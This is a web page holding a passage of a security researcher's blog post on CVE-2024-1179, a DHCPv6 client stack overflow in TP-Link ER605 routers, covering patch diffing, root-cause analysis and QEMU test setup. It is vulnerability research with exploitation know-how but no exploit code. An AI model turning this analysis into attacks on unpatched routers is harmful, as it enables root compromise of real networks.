<!doctype html><html lang=en-US><head><meta charset=UTF-8><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=robots content="index, follow"><meta name=author content="dilag"><meta name=description content="Analyse CVE-2024-1179, a vulnerability used to get RCE in TP Link router during Pwn2Own TORONTO 2023 contest"><link rel=author type=text/plain href=/humans.txt><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon href=/favicon.ico type=image/x-icon><link rel=icon href=https://dilagluc.github.io/images/favicon.min.svg type=image/svg+xml><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta name=msapplication-TileImage content="/mstile-144x144.png"><meta name=theme-color content="#494f5c"><meta name=msapplication-TileColor content="#494f5c"><link rel=mask-icon href=/safari-pinned-tab.svg color=#494f5c><meta itemprop=name content="TP Link CVE-2024-1179 analysis"><meta itemprop=description content="Analyse CVE-2024-1179, a vulnerability used to get RCE in TP Link router during Pwn2Own TORONTO 2023 contest"><meta itemprop=datePublished content="2025-04-04T20:32:54+02:00"><meta itemprop=dateModified content="2025-04-04T20:32:54+02:00"><meta itemprop=wordCount content="11986"><meta itemprop=keywords content="Exploit Development,Reverse,Cve,Hardware,Firmware Analysis"><meta property="og:url" content="https://dilagluc.github.io/en/posts/2025/cve_analysis/tplink_cve_2024_1179/"><meta property="og:site_name" content="Blog"><meta property="og:title" content="TP Link CVE-2024-1179 analysis"><meta property="og:description" content="Analyse CVE-2024-1179, a vulnerability used to get RCE in TP Link router during Pwn2Own TORONTO 2023 contest"><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-04-04T20:32:54+02:00"><meta property="article:modified_time" content="2025-04-04T20:32:54+02:00"><meta property="article:tag" content="Exploit Development"><meta property="article:tag" content="Reverse"><meta property="article:tag" content="Cve"><meta property="article:tag" content="Hardware"><meta property="article:tag" content="Firmware Analysis"><meta name=twitter:card content="summary"><meta name=twitter:title content="TP Link CVE-2024-1179 analysis"><meta name=twitter:description content="Analyse CVE-2024-1179, a vulnerability used to get RCE in TP Link router during Pwn2Own TORONTO 2023 contest"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TP Link CVE-2024-1179 analysis","name":"TP Link CVE-2024-1179 analysis","description":"Analyse CVE-2024-1179, a vulnerability used to get RCE in TP Link router during Pwn2Own TORONTO 2023 contest","keywords":["exploit development","reverse","cve","Hardware","Firmware Analysis"],"articleBody":"Introduction The shift to remote work has dramatically increased the importance of securing Small Office/Home Office (SOHO) network devices. These consumer devices often present security challenges due to their limited security capabilities and inconsistent update practices. This has created an urgent need to better understand and address vulnerabilities in the SOHO ecosystem.\nThis blogpost presents an in-depth technical analysis of CVE-2024-1179, a vulnerability affecting TP-Link Omada ER605 routers. We’ll describe the root cause of this vulnerability and provide an exploitation path.\nDetailed analysis This vulnerability seems first to be exploited at Pwn2Own TORONTO 2023 contest. The advisory from ZDI website is as follow:\n[!note]- ZDI advisory AFFECTED VENDORS: TP-Link\nAFFECTED PRODUCTS: Omada ER605\nVULNERABILITY DETAILS :This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of TP-Link Omada ER605 routers. Authentication is not required to exploit this vulnerability.\nThe specific flaw exists within the handling of DHCP options. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of root.\nADDITIONAL DETAILS : Fixed in firmware: ER605(UN)_V2_2.2.4 Build 20240119\nAlso on the Nist Website, we get some valuable information about the vulnerability.\n[!note]- NIST CVE-2024-1179 Detail Description: TP-Link Omada ER605 DHCPv6 Client Options Stack-based Buffer Overflow Remote Code Execution Vulnerability. This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of TP-Link Omada ER605 routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the handling of DHCP options. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-22420.\nSince we have information about the fixed version, we can start a patch diff process to begin our analysis.\nPatch diffing Retrieve binaries The advisory published gives us a valuable information about the component affected by this bug. It is the DHCPv6 client of the router. We also know from the advisory that the bug was fixed in the firmware version ER605(UN)_V2_2.2.4 Build 20240119. With all this information in hand, we can start the patch diffing process.\nSince we want to do a patch diffing, we will need both the vulnerable and patched DHCPv6 client binaries. We just googled the patched firmware version ER605(UN)_V2_2.2.4 Build 20240119 and we found a link that talks about the official release of this version: https://community.tp-link.com/en/business/forum/topic/653062 On this website we also found a link to download the firmware: https://static.tp-link.com/upload/firmware/2024/202401/20240124/ER605(UN)_v2_2.2.4%20Build%2020240119.zip\nThe website also mentioned the exact name of the previous firmware version:\nSo we just googled ER605(UN)_V2_2.2.3 Build 20231201 and found the link to download it too: https://static.tp-link.com/upload/firmware/2023/202312/20231221/ER605(UN)_v2_2.2.3%20Build%2020231201.zip\nThe downloaded zip archives contain a license and .bin file which is probably the firmware. Using binwalk, we found that there is a Squashfs file system in the .bin file.\nWe then extract them using the binwalk -e options.\nWe can navigate to the directory containing the file system:s\nAfter retrieving the Squashfs file system for both firmware versions, we can now search for the DHCPv6 client binaries and retrieve both the vulnerable and patched versions. The binary can be found in /usr/sbin/dhcp6c on both firmwares. We notice that the binary is a ELF 32-bit, running on MIPS32 version 1 architecture. The loader is located at /lib/ld-musl-mipsel-sf.so.1. So the architecture is MIPSEL32 (MIPS32 endianness little).\nComparison To compare the two binaries, we will first use BinDiff. Since we don’t have an IDAPro, we are going to use Ghidra to export our binaries and load them to BinDiff. This blog post explains how to to do this. The result looks like this:\nWe can see on the similarity column that 4 functions have changed: sub_405F08, sub_40C66C, sub_40C3B0 and sub_402D74. For example for the sub_405F08 function, we can see changes to some basics blocs marked with blue color and some new basics blocs added in the patched version (right side), marked with red color.\nThen, we use another tool ghidriffs which does some recapitulation and shows differences but between decompiled code, much more readable than assembly code.\nsudo docker run -it --rm -v $(pwd)/ghidriffs:/ghidriffs ghcr.io/clearbluejar/ghidriff:latest ghidriffs/dhcp6c_3 ghidriffs/dhcp6c_4 The recap file generated by ghidriffs is also attached with the paper. We can start by inspecting which strings are added to the new version.\nWe can see that two strings have been added to the patched version. They are both related to the DHCP6_AFTRNAME options. Remember from advisory that the flaw exists within the handling of DHCP options, and AFTR_NAME is one of the DHCPv6 options. So sub_405F08 is probably one of the vulnerable functions we are looking for (if there are many). Additionally, if we take a look at where these new strings were added, we can see a call to the memcpy function (which is a dangerous function that could lead to buffer overflow if the bounds are not correctly checked) and a check added around this function on the patched version. Also some strings explicitly mentioned malformed DHCP option or dhcp6_get_options, and we can assume that this function is the one that handle DHCPv6 options. So no doubt, this is one of the vulnerable functions we are looking for.\nLet’s quickly analyze the other functions we have identified earlier with BinDiff. ghiddriffs shows us that the functions sub_40C66C and sub_402D74 are never called. We can ignore them then.\nFor the function sub_40C3B0, we can see that it’s called by the one function. Furthermore, a call to strcpy is replaced by strncpy in the patched version, so we might first think that this function is potentially vulnerable to a buffer overflow and there is something to do with it.\nTo be sure whether or not this function is concerned by the advisory, we need to look more closely. First, we didn’t identify any strings in the decompiled code of this function. Second, we cross-referenced this function and its caller and found that it is related to address updating.\nWe conclude that this function is not related to the advisory.\nThe vulnerable function is then the function sub_405F08.\nRoot Cause Analysis Static analysis As we identified earlier, the vulnerable function is sub_405F08. We check some of the strings in the binary against open source libraries (strings like dhcp6_get_otions: unsupported authentication protocol). This can make a reverse engineering process much easier. We discovered the OPNsense project github repository. After taking a close look at this project, we found that it has a lot in common with the binary we are reversing, although there are some differences. For example, there are a lot of similarities (we will confirm this later) between the sub_405F08 and the dhcp6_get_options function. We can use this repo as baseline for our analysis. Let’s revisit the diff from ghiddrifs :\nWe can see that there is a large switch (case), which does some actions on each case. From picture above, we can see that the vulnerability exists in case 0x40. In comparison with the dhcp6_get_options function, there is also a switch(case) where each case is a DHCPv6 options (like DH6OPT_IA_NA, DH6OPT_IA_NA, etc). An in depth analysis shows that this function handles any DHCPv6 options received in the first argument. Indeed, as we can see below, we can easily spot that p is the pointer to the beginning of many dhcp6opt elements. In the for loop, we can see that the function gets the current dhcp6opt element (the cp pointer) and the next dhcp6opt element based on p(the np pointer). And np(next pointer) is used for the next iteration.\nstruct dhcp6opt { uint16_t dh6opt_type; uint16_t dh6opt_len; /* type-dependent data follows */ } __attribute__ ((__packed__)); c The pointer is then used to get the option type and handle it accordingly using the switch case.\nAs we know that this project shares a lot of similarities with the binary we are reversing, we can assume that like the function dhcp6_get_options functions , the sub_405f08 function also handles each DHCPv6 options received in first argument.\nFrom the advisory, we know that the vulnerability exists for the AFTR_NAME options, but we have not found such option in the dhcp6_get_options function. However, from here https://www.iana.org/assignments/dhcpv6-parameters/dhcpv6-parameters.xhtml, we found that value 0x40=64 is for AFTR_NAME.\nWe can now assume that the OPNsense is used as the baseline and the AFTR_NAME options has been added to support this options. So case 0x40=64 corresponds to AFTR_NAME options and was added by TP Link to support AFTR_NAME option.\nBut wait, what is a DHCPv6 option ?\nAccording to RFC 8415:\nThus, DHCPv6 options are parameters that provide additional configuration information to IPv6 clients beyond just IP addresses. Some options are:\nAnd AFTR_NAME is one of the options that is used for Dual-Stack Lite. AFTR stands for Address Family Transition Router’s and according to RFC 6334:\nWith all this information in hand, let’s move on.\nNow let’s analyze the vulnerable part of the function. As we know from earlier analysis, a check was added around a call to memcpy in the patched version. Let’s focus our analysis there. So, let’s assume that the overflow is certainly caused by the memcpy function and start our analysis from there.\nmemcpy((char *)((int)local_14 + local_20),(char *)((int)piVar3 + (int)local_18),local_28); The first argument of memcpy which is local14 (the destination buffer) comes from the third parameter passed to the function.\nThe second argument, the source buffer which is puVar9 comes from the the first parameter passed to the function. And the third argument (local_28 = cVar1) which is the byte size to copy from source to destination also comes from the first parameter passed to the function. We can also see that we can write multiples times with the destination growing up, until the local_28 which is the size argument of memcpy is 0.\nAs we know that this function is almost equivalent to dhcp6_get_options from OPNsense project, let’s check its signature.\nint dhcp6_get_options(struct dhcp6opt *p, struct dhcp6opt *ep, struct dhcp6_optinfo *optinfo) The first and third parameters of this function are respectively of type dhcp6opt and dhcp6_optinfo defined as below:\nstruct dhcp6opt { uint16_t dh6opt_type; uint16_t dh6opt_len; /* type-dependent data follows */ } __attribute__ ((__packed__)); struct dhcp6_optinfo { struct duid clientID;\t/* DUID */ struct duid serverID;\t/* DUID */ int rapidcommit;\t/* bool */ int pref;\t/* server preference */ int32_t elapsed_time;\t/* elapsed time (from client to server only) */ int64_t refreshtime;\t/* info refresh time for stateless options */ struct dhcp6_list iapd_list; /* list of IA_PD */ struct dhcp6_list iana_list; /* list of IA_NA */ struct dhcp6_list reqopt_list; /* options in option request */ struct dhcp6_list stcode_list; /* status code */ struct dhcp6_list sip_list; /* SIP server list */ struct dhcp6_list sipname_list; /* SIP domain list */ struct dhcp6_list dns_list; /* DNS server list */ struct dhcp6_list dnsname_list; /* Domain Search list */ struct dhcp6_list ntp_list; /* NTP server list */ struct dhcp6_list prefix_list; /* prefix list */ struct dhcp6_list nis_list; /* NIS server list */ struct dhcp6_list nisname_list; /* NIS domain list */ struct dhcp6_list nisp_list; /* NIS+ server list */ struct dhcp6_list nispname_list; /* NIS+ domain list */ struct dhcp6_list bcmcs_list; /* BCMC server list */ struct dhcp6_list bcmcsname_list; /* BCMC domain list */ struct rawop_list rawops; /* Raw option list */ struct dhcp6_vbuf relay_msg; /* relay message */ #define relaymsg_len relay_msg.dv_len #define relaymsg_msg relay_msg.dv_buf struct dhcp6_vbuf ifidopt; /* Interface-id */ #define ifidopt_len ifidopt.dv_len #define ifidopt_id ifidopt.dv_buf u_int authflags; #define DHCP6OPT_AUTHFLAG_NOINFO\t0x1 int authproto; int authalgorithm; int authrdm; /* the followings are effective only when NOINFO is unset */ uint64_t authrd; union { struct { uint32_t keyid; struct dhcp6_vbuf realm; int offset; /* offset to the HMAC field */ } aiu_delayed; struct { int type; int offset; /* offset to the HMAC field */ char val[16]; /* key value */ } aiu_reconfig; } authinfo; #define delayedauth_keyid authinfo.aiu_delayed.keyid #define delayedauth_realmlen authinfo.aiu_delayed.realm.dv_len #define delayedauth_realmval authinfo.aiu_delayed.realm.dv_buf #define delayedauth_offset authinfo.aiu_delayed.offset #define reconfigauth_type authinfo.aiu_reconfig.type #define reconfigauth_offset authinfo.aiu_reconfig.offset #define reconfigauth_val authinfo.aiu_reconfig.val }; And based on the OPNsense project, our memcpy is almost equivalent to the following, except for the first and third argument.\nWe can follow their syntax and our memcpy can be rewritten as follows:\nmemcpy(optinfo_something,something_from_cp,something_from_cp_len); It is now more clear. As cp is of the type dhcp6opt defined earlier, if we can control it, we can control how many bytes to write into optinfo and possibly overflow it because we can write multiple times we can write to optinfo and reach it ends. But from our earlier analysis, we know that cp is the pointer to the beginning of our AFTR_NAME options raw data and this pointer is obtained from the p passed as the first argument to dhcp6_get_options. So if we can control p which is the start of all options passed, we can control how many bytes to write into optinfo. And as the memcpy is in for-loop and the destination address grows by the number of bytes we wrote earlier, we can write many times until we reach the end of optinfo and possibly cause the overflow.\nLet’s find a way to control this parameter. But before that, we need to figure out how to reach this function. After digging around the OPNsense project, we found that the only place where thedhcp6_get_options function is called is in client6_recv function. This function handles the received packets. After some analysis of the code, we note that the received packet is used to construct p and ep that get passed to dhcp6_get_options function.\nstatic void client6_recv(void) { char rbuf[BUFSIZ], cmsgbuf[BUFSIZ]; struct msghdr mhdr; struct iovec iov; struct sockaddr_storage from; struct dhcp6_if *ifp; struct dhcp6opt *p, *ep; struct dhcp6_optinfo optinfo; ssize_t len; struct dhcp6 *dh6; struct cmsghdr *cm; struct in6_pktinfo *pi = NULL; memset(\u0026iov, 0, sizeof(iov)); memset(\u0026mhdr, 0, sizeof(mhdr)); iov.iov_base = (caddr_t)rbuf; iov.iov_len = sizeof(rbuf); mhdr.msg_name = (caddr_t)\u0026from; mhdr.msg_namelen = sizeof(from); mhdr.msg_iov = \u0026iov; mhdr.msg_iovlen = 1; mhdr.msg_control = (caddr_t)cmsgbuf; mhdr.msg_controllen = sizeof(cmsgbuf); if ((len = recvmsg(sock, \u0026mhdr, 0)) \u003c 0) { d_printf(LOG_ERR, FNAME, \"recvmsg: %s\", strerror(errno)); return; } /* detect receiving interface */ for (cm = (struct cmsghdr *)CMSG_FIRSTHDR(\u0026mhdr); cm; cm = (struct cmsghdr *)CMSG_NXTHDR(\u0026mhdr, cm)) { if (cm-\u003ecmsg_level == IPPROTO_IPV6 \u0026\u0026 cm-\u003ecmsg_type == IPV6_PKTINFO \u0026\u0026 cm-\u003ecmsg_len == CMSG_LEN(sizeof(struct in6_pktinfo))) { pi = (struct in6_pktinfo *)(void *)(CMSG_DATA(cm)); } } if (pi == NULL) { d_printf(LOG_NOTICE, FNAME, \"failed to get packet info\"); return; } if ((ifp = find_ifconfbyid((unsigned int)pi-\u003eipi6_ifindex)) == NULL) { d_printf(LOG_INFO, FNAME, \"unexpected interface (%d)\", (unsigned int)pi-\u003eipi6_ifindex); return; } if ((size_t)len \u003c sizeof(*dh6)) { d_printf(LOG_INFO, FNAME, \"short packet (%d bytes)\", len); return; } dh6 = (struct dhcp6 *)rbuf; d_printf(LOG_DEBUG, FNAME, \"receive %s from %s on %s\", dhcp6msgstr(dh6-\u003edh6_msgtype), addr2str((struct sockaddr *)\u0026from), ifp-\u003eifname); /* get options */ dhcp6_init_options(\u0026optinfo); p = (struct dhcp6opt *)(dh6 + 1); ep = (struct dhcp6opt *)((char *)dh6 + len); if (dhcp6_get_options(p, ep, \u0026optinfo) \u003c 0) { d_printf(LOG_INFO, FNAME, \"failed to parse options\"); return; } switch(dh6-\u003edh6_msgtype) { case DH6_ADVERTISE: (void)client6_recvadvert(ifp, dh6, len, \u0026optinfo); break; case DH6_REPLY: (void)client6_recvreply(ifp, dh6, len, \u0026optinfo); break; default: d_printf(LOG_INFO, FNAME, \"received an unexpected message (%s) \" \"from %s\", dhcp6msgstr(dh6-\u003edh6_msgtype), addr2str((struct sockaddr *)\u0026from)); break; } dhcp6_clear_options(\u0026optinfo); return; } We can easily guess here that the p pointer that get passed to dhcp6_get_options is indeed the pointer to the beginning of all DHCPv6 options raw data contains in the packets. We will confirm it later through dynamic analysis. So, if we can control how p is constructed, we can control the source and size argument of memcpy, and since we can write many times with destination pointer growing, we can potentially overwrite subsequent data. Let’s switch to dynamic analysis, to analyze how p is constructed and how we can tweak it. But first, we need to set up our environment.\nDynamic analysis Environment setup At the beginning, we wanted a full system emulation using QEMU. On the ZDI blog we found this blog post which helps us to build our environment. We build our environment by downloading vmlinux-3.2.0-4-4kc-malta kernel and debian_wheezy_mipsel_standard.qcow2 images. Then we use the following command line to start the Qemu VM (Virtual Machine).\nsudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append \"root=/dev/sda1 console=tty0\" -net user,hostfwd=tcp::80-:80,hostfwd=tcp::443-:443,hostfwd=tcp::2222-:22 -net nic -nographic Once in the Qemu VM, we use scp to transfer the Squashfs file system into the VM (we zipped it first and unzipped it once in the VM) and then we follow the next steps described in the ZDI blog post :\ncd squashfs-root/ mount -o bind /sys/ sys/ mount -o bind /proc/ proc/ mount -o bind /dev/ dev/ chroot . /bin/sh We then check the inittab file to know how to start the router. According to this file, we need to execute the /etc/init.d/rcS file to start the router. But we didn’t find such file.\nAfter digging into the file system, we found that it was an OpenWrt based router.\nWe found online the boot process of an OpenWRT based router: https://stackoverflow.com/questions/66544765/how-and-when-openwrts-procd-runs-init-scripts-in-etc-init-d\n/init - \u003e /sbin/init -\u003e /etc/preinit -\u003e /sbin/procd -\u003e /etc/rc.d/* So, we run the /sbin/init binary , but it seems not to start everything.\nor directory. cp: can't stat '/etc/avahi/services/http.service': No such file or directory cp: can't stat '/etc/avahi/services/ssh.service': No such file or directory cp: can't stat '/etc/config/https-dns-proxy': No such file or directory cp: can't stat '/etc/config/openvpn-mgmt': No such file or directory cp: can't stat '/etc/config/portal-mgmt': No such file or directory cp: can't stat '/etc/ndppd.conf': No such file or directory cp: can't stat '/etc/uhttpd.crt': No such file or directory cp: can't stat '/etc/uhttpd.key': No such file or directory Saved As the advisory doesn’t specify that a specific configuration is required to trigger the vulnerability, we decide to directly launch the dhcp6c client binary without emulating the full router. But we encounter an issue : setsockopt SO_REUSEPORT not available. We later found that to fix this issue, we need a kernel version greater or equal to 3.9:\nDebian Jessie was using kernel version 3.16, so we get an old kernel vmlinux-3.16.0-6-4kc-malta, and readjust the Qemu startup script.\nsudo qemu-system-mipsel -M malta -kernel vmlinux-3.16.0-6-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append \"root=/dev/sda1 console=tty0\" -net user,hostfwd=tcp::80-:80,hostfwd=tcp::443-:443,hostfwd=tcp::2222-:22 -net nic -nographic And then try to run the dhcp6c binary. It works.\n/ # /usr/sbin/dhcp6c usage: dhcp6c [-c configfile] [-dDfi] [-p pid-file] [ -v vendor ] interface [interfaces...] It works fine. It prints to us how to use the binary. We can see that we could pass a configuration file to it. We also need to specify the interface to use, it is mandatory. To understand more how to use it, we search on internet and we see that there is also the options (-dDf) to print log and debugging messages (https://man.freebsd.org/cgi/man.cgi?query=dhcp6c) and start it in foreground mode.\nThe -i option starts the binary with the specific configuration where the client broadcast an Information-request dhcp message and print log on stdout (confirmed after via wireshark). We then start the binary with -dDfi options:\n/ # /usr/sbin/dhcp6c -dDfi usage: dhcp6c [-c configfile] [-dDfi] [-p pid-file] [ -v vendor ] interface [interfaces...] / # /usr/sbin/dhcp6c -dDfi eth0 Oct/27/2024 13:53:48: gethwid: found an interface eth0 for DUID Oct/27/2024 13:53:48: get_duid: generated a new DUID: 00:03:00:01:52:54:00:12:34:56 Oct/27/2024 13:53:48: dhcp6_ctl_authinit: failed to open /etc/dhcp6cctlkey: No such file or directory Oct/27/2024 13:53:48: client6_init: failed initialize control message authentication Oct/27/2024 13:53:48: client6_init: skip opening control port Oct/27/2024 13:53:48: client6_init: client6_init 502 client6_init succeed client6_init 503 client6_init succeed Oct/27/2024 13:53:48: dhcp6_reset_timer: reset a timer on eth0, state=INIT, timeo=0, retrans=680 Oct/27/2024 13:53:49: client6_send: a new XID (a75986) is generated Oct/27/2024 13:53:49: copy_option: set client ID (len 10) Oct/27/2024 13:53:49: copy_option: set elapsed time (len 2) Oct/27/2024 13:53:49: client6_send: send information request to ff02::1:2%eth0 Oct/27/2024 13:53:49: dhcp6_reset_timer: reset a timer on eth0, state=INFOREQ, timeo=0, retrans=1000 Oct/27/2024 13:53:49: client6_recv: receive reply from fec0::2 on eth0 Oct/27/2024 13:53:49: dhcp6_get_options: get DHCP option client ID, len 10 Oct/27/2024 13:53:49: DUID: 00:03:00:01:52:54:00:12:34:56 Oct/27/2024 13:53:49: client6_recvreply: no server ID option Oct/27/2024 13:53:50: copy_option: set client ID (len 10) Oct/27/2024 13:53:50: copy_option: set elapsed time (len 2) Oct/27/2024 13:53:50: client6_send: send information request to ff02::1:2%eth0 Oct/27/2024 13:53:50: dhcp6_reset_timer: reset a timer on eth0, state=INFOREQ, timeo=1, retrans=1959 Oct/27/2024 13:53:50: client6_recv: receive reply from fec0::2 on eth0 Oct/27/2024 13:53:50: dhcp6_get_options: get DHCP option client ID, len 10 Oct/27/2024 13:53:50: DUID: 00:03:00:01:52:54:00:12:34:56 Oct/27/2024 13:53:50: client6_recvreply: no server ID option Oct/27/2024 13:53:52: copy_option: set client ID (len 10) Oct/27/2024 13:53:52: copy_option: set elapsed time (len 2) Oct/27/2024 13:53:52: client6_send: send information request to ff02::1:2%eth0 Oct/27/2024 13:53:52: dhcp6_reset_timer: reset a timer on eth0, state=INFOREQ, timeo=2, retrans=3732 Oct/27/2024 13:53:52: client6_recv: receive reply from fec0::2 on eth0 Oct/27/2024 13:53:52: dhcp6_get_options: get DHCP option client ID, len 10 Oct/27/2024 13:53:52: DUID: 00:03:00:01:52:54:00:12:34:56 Oct/27/2024 13:53:52: client6_recvreply: no server ID option We can see some debugging information. In particular we can see a call to dhcp_get_options and client6_recv, which confirms that using OPNsense project code for analysis was a good idea and we are on right path. However, in the current configuration, the binary uses the default Qemu user networking stack, so we are using the Qemu internal DHCP server which is not under our control. As we are attacking an dhcp6 client we need to have a DHCPv6 server that can send response to each DHCPv6 requests sent by the client. So as mentioned in the advisory attacker needs to be network adjacent to the router to be able to send a DHCPv6 messages. We will simulate this configuration using Qemu and network bridge.\nThe first thing we need to do is to transfer a prebuilt statically linked gdbserver to the qemu environment so we can easily debug the binary from our host.\nNow we are going to simulate an environment where our host will be network adjacent to the router. The qemu VM will act as the router. We will create a network bridge that allows the qemu virtual machine to communicate with our host system and the outside network. It’s like the qemu VM representing the router and our host machine are connected to a switch and this switch is connected to the internet. We then came up with the following bash script\n#!/bin/bash sudo ip link set br0 down sudo brctl delbr br0 sudo ifconfig enp0s31f6 down sudo brctl addbr br0 sudo brctl addif br0 enp0s31f6 sudo ifconfig br0 0.0.0.0 promisc up sudo ifconfig enp0s31f6 0.0.0.0 promisc up sudo dhclient br0 sudo tunctl -t tap0 sudo brctl addif br0 tap0 sudo ifconfig tap0 0.0.0.0 promisc up sudo qemu-system-mipsel \\ -M malta -kernel vmlinux-3.16.0-6-4kc-malta \\ -hda debian_wheezy_mipsel_standard.qcow2 \\ -append \"root=/dev/sda1\" \\ -net nic,macaddr=00:11:22:33:44:55 \\ -net tap,ifname=tap0,script=no,downscript=no \\ -nographic Let’s explain:\nCleanup Previous Configuration sudo ip link set br0 down sudo brctl delbr br0 If a network bridge named br0 already exists, this brings it down and deletes it to ensure no conflicts when creating a new bridge.\nSet Up Physical Network Interface for Bridging sudo ifconfig enp0s31f6 down sudo brctl addbr br0 sudo brctl addif br0 enp0s31f6 Bring down our physical network interface enp0s31f6 and add it to a new bridge interface br0.\nConfigure br0 and enp0s31f6 Interfaces sudo ifconfig br0 0.0.0.0 promisc up sudo ifconfig enp0s31f6 0.0.0.0 promisc up sudo dhclient br0 These commands activate the bridge and physical interface in promiscuous mode (allowing them to handle all network traffic, not just those addressed to them directly) and request an IP address from our network’s DHCP server. (FAI)\nCreate and Configure Virtual Network Interface (tap0) sudo tunctl -t tap0 sudo brctl addif br0 tap0 sudo ifconfig tap0 0.0.0.0 promisc up This creates a TAP interface (virtual network adapter) and connects it to our bridge\nLaunch QEMU sudo qemu-system-mipsel \\ -M malta -kernel vmlinux-3.16.0-6-4kc-malta \\ -hda debian_wheezy_mipsel_standard.qcow2 \\ -append \"root=/dev/sda1\" \\ -net nic,macaddr=00:11:22:33:44:55 \\ -net tap,ifname=tap0,script=no,downscript=no \\ -nographic Emulation and Machine Options: -M malta: Specifies the MIPS Malta development board emulation. -kernel vmlinux-3.16.0-6-4kc-malta: Uses 3.16 Linux kernel. -hda debian_wheezy_mipsel_standard.qcow2: Specifies the disk image for the VM. -append \"root=/dev/sda1\": Sets the root filesystem to /dev/sda1. Networking: -net nic,macaddr=00:11:22:33:44:55: Creates a network device with a specified MAC address. -net tap,ifname=tap0,script=no,downscript=no: Sets up a TAP network backend using tap0 for connectivity. After running this script and letting the qemu VM boot, we inspect our host network configuration with ifconfig command.\n~$ ip a . . . 2: enp0s31f6: mtu 1500 qdisc pfifo_fast master br0 state UP group default qlen 1000 link/ether 38:f7:cd:c4:d9:99 brd ff:ff:ff:ff:ff:ff . . . 8: tap0: mtu 1500 qdisc pfifo_fast master br0 state UP group default qlen 1000 link/ether ae:69:9b:7b:56:e1 brd ff:ff:ff:ff:ff:ff 11: br0: mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether da:30:2c:48:59:a8 brd ff:ff:ff:ff:ff:ff inet 10.212.81.52/16 brd 10.212.255.255 scope global dynamic noprefixroute br0 valid_lft 603777sec preferred_lft 603777sec inet6 fe80::542b:76ce:631b:36ce/64 scope link noprefixroute valid_lft forever preferred_lft forever We can see there that the newly created bridge br0 get assigned the IP address 10.212.81.52 (private address) with a /16 mask. So we are on the subnet 10.212.0.0/16. On the qemu VM, we also inspect the network configuration. We notice that it’s eth0 interface get assigned the IP address 10.212.141.194 which is an address belonging to 10.212.0.0/16 subnet. Thus the host and the qemu VM are now on the same subnet.\n/ # root@debian-mipsel:~/squashfs-root# ifconfig eth0 Link encap:Ethernet HWaddr 00:11:22:33:44:55 inet addr:10.212.141.194 Bcast:10.212.255.255 Mask:255.255.0.0 inet6 addr: fe80::211:22ff:fe33:4455/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:3554 errors:1 dropped:78 overruns:0 frame:0 TX packets:38 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:643796 (628.7 KiB) TX bytes:3724 (3.6 KiB) Interrupt:11 Base address:0x1060 lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B) However in this configuration we have a private network between the host and the VM. That is enough to do what we want. We can ping the host from the VM.\n/ # ping 10.212.81.52 PING 10.212.81.52 (10.212.81.52): 56 data bytes 64 bytes from 10.212.81.52: seq=0 ttl=64 time=2.117 ms 64 bytes from 10.212.81.52: seq=1 ttl=64 time=1.017 ms ^C --- 10.212.81.52 ping statistics --- 2 packets transmitted, 2 packets received, 0% packet loss round-trip min/avg/max = 1.017/1.567/2.117 ms But we need more if we want the VM to access internet. The packet coming from the router can reach the bridge br0, but cannot reach the internet. We just need to add a NAT rule in iptables for outgoing traffic from our subnet.\nsudo iptables -t nat -A POSTROUTING -s 10.212.0.0/16 -o br0 -j MASQUERADE Now we have a configuration where br0 acts as a switch connecting our host and the router, and then the switch is connected to internet.\nNow start the binary with an empy configuration file, and start capturing network packets on br0 interface using Wireshark. We can see a DHCP sollicit message on Wireshark.\n/ # /usr/sbin/dhcp6c -dDf -c test.conf eth0 Oct/29/2024 00:37:51: gethwid: found an interface eth0 for DUID Oct/29/2024 00:37:51: get_duid: generated a new DUID: 00:03:00:01:00:11:22:33:44:55 Oct/29/2024 00:37:51: dhcp6_ctl_authinit: failed to open /etc/dhcp6cctlkey: No such file or directory Oct/29/2024 00:37:51: client6_init: failed initialize control message authentication Oct/29/2024 00:37:51: client6_init: skip opening control port Oct/29/2024 00:37:51: client6_init: client6_init 502 client6_init succeed client6_init 503 client6_init succeed Oct/29/2024 00:37:51: configure_pool: called Oct/29/2024 00:37:51: clear_poolconf: called Oct/29/2024 00:37:51: dhcp6_reset_timer: reset a timer on eth0, state=INIT, timeo=0, retrans=514 Oct/29/2024 00:37:52: client6_send: a new XID (c599) is generated Oct/29/2024 00:37:52: copy_option: set client ID (len 10) Oct/29/2024 00:37:52: copy_option: set elapsed time (len 2) Oct/29/2024 00:37:52: copy_option: set option request (len 2) Oct/29/2024 00:37:52: client6_send: send solicit to ff02::1:2%eth0 Oct/29/2024 00:37:52: dhcp6_reset_timer: reset a timer on eth0, state=SOLICIT, timeo=0, retrans=1050 Oct/29/2024 00:37:53: copy_option: set client ID (len 10) Oct/29/2024 00:37:53: copy_option: set elapsed time (len 2) Oct/29/2024 00:37:53: copy_option: set option request (len 2) Oct/29/2024 00:37:53: client6_send: send solicit to ff02::1:2%eth0 Oct/29/2024 00:37:53: dhcp6_reset_timer: reset a timer on eth0, state=SOLICIT, timeo=1, retrans=2056 